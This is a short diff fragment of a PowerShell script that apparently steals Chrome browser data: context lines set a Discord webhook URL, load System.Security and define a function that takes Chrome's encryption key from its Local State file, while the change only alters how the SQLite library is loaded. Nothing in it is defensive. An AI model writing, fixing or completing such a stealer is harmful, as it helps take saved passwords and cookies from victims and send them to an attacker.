@@ -5,7 +5,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1453518648726523996/Uv-gp_SmhlEY
 
 # Load necessary .NET assemblies
 Add-Type -AssemblyName "System.Security"
-Add-Type -AssemblyName "System.Data.SQLite"
+Add-Type -Path "C:\path\to\System.Data.SQLite.dll"  # Load the SQLite assembly from the specified path
 
 # Function to get the Chrome encryption key from Local State file
 function Get-ChromeEncryptionKey {
